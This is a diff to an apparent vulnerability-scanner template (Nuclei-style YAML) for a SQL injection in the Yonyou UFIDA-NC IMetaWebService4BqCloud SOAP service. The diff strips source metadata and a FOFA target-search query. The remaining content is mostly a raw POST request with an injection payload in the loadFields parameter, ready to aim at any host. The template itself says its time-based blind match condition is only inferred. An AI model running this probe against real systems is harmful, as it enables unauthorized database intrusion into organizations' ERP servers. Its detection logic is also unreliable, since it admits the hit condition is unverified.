@@ -3,14 +3,8 @@ info:
   name: 用友-UFIDA-NC IMetaWebService4BqCloud数据源SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gg6uexpmskgb1091
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gg6uexpmskgb1091
-    fofa: app="用友-UFIDA-NC"
 http:
 - raw:
   - "POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: JSESSIONID=09133CFE3A7B0CE8341AB1A7DEDFCCDE.server\nConnection: keep-alive\nSOAPAction: urn:loadFields\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 350\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:imet=\"http://meta.ae.pubitf.uap/IMetaWebService4BqCloud\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <imet:loadFields>\n         <!--type: string-->\n         <imet:string>SmartModel^1';*</imet:string>\n      </imet:loadFields>\n   </soapenv:Body>\n</soapenv:Envelope>"
